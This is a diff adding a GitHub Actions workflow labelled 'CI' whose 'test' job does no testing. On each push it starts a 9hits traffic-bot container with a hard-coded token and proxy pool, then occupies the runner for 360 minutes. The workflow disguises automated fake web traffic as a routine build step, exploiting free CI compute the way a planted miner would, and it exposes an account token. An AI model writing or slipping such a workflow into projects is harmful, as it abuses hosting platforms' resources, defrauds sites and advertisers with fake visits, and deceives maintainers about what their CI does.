@@ -1,0 +1,17 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  test:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Debug
+      run: |
+        docker run -d --network=host --name=9hits 9hitste/appv5 /nh.sh --token=e0ebc71df2b7f3fd4684aa26ba99ffcc --system-session --ex-proxy-sessions=15 --ex-proxy-url=http://proxy.9hits.com/pool/c47c92ab852972abd1439bc9b7bd239a --allow-crypto=no --session-note=http-pool --note=my-vps --hide-browser
+    - name: Sleep for 360 minutes
+      uses: jakejarvis/wait-action@master
+      with:
+        time: '360m'
